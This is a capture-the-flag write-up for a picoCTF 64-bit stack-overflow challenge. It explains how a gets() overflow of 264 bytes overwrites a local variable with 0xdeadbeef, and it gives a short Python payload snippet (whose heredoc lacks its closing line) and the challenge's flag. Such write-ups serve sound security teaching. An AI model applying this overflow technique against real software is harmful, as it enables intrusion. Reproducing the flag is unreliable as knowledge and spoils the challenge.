# Challenge Description
This is a small 64-bit picoCTF binary that reads an uncontrolled string with gets() into a local buffer called clutter, and then checks a nearby stack variable code against the constant 0xdeadbeef. The goal is to overflow clutter and overwrite code so the program prints the flag.

## Solution:

I suspected a classic stack overflow due to the use of gets() (no bounds checks). Instead of aiming for the return address, I inspected the binary to see if there were local variables near the buffer that could be overwritten. The source/disassembly showed code stored at rbp-0x8 and clutter earlier on the stack, so overwriting code directly is possible.

Make the binary executable and run it to observe behavior:
```
chmod +x chall
./chall
```
Use gdb (with gef/pwndbg) to inspect the stack and find offsets.
Generate a cyclic pattern to find the overflow offset.
Determine the offset to code (found to be 264 bytes in this writeup).
Craft the payload (264 'A's + little-endian 0xdeadbeef).
Payload construction (example):
```
python3 - <<'PY' > payload.bin
import sys
sys.stdout.buffer.write(b"A"*264 + b"\xef\xbe\xad\xde" + b"\x00"*4)
```

Test locally and then send to remote with nc.


## Flag:
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:
Overwriting local variables vs return address.
Using cyclic patterns to find offsets.
Endianness when writing raw values.

## Notes:
Initially tried return-address overwrite but switched to overwriting code found nearby.
On local runs flag.txt was absent; remote server contains the real flag.
